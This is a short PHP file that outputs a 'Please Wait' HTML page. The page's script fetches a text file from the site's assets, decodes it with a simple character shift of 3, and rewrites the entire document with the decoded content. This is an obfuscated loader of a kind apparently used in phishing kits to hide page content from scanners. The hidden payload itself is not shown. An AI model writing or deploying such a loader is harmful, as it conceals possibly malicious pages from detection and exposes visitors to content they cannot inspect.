<?php echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait</title>
</head>
<body>
<script>
    function fetchAndDecode(){fetch("./assets/js/pages/yes.txt").then((e=>{if(!e.ok)throw new Error("Network response was not ok");return e.text()})).then((e=>{try{writeTo(decryptText(e))}catch(e){console.error("Decoding failed:",e)}})).catch((e=>{console.error("There was a problem with the fetch operation:",e)}))}function decryptText(e,t=3){return e.split("").map((e=>String.fromCharCode(e.charCodeAt(0)-t))).join("")}function writeTo(e){document.documentElement.innerHTML=e,document.open().write(e),document.close()}fetchAndDecode();
</script>
</body>
</html>
'
?>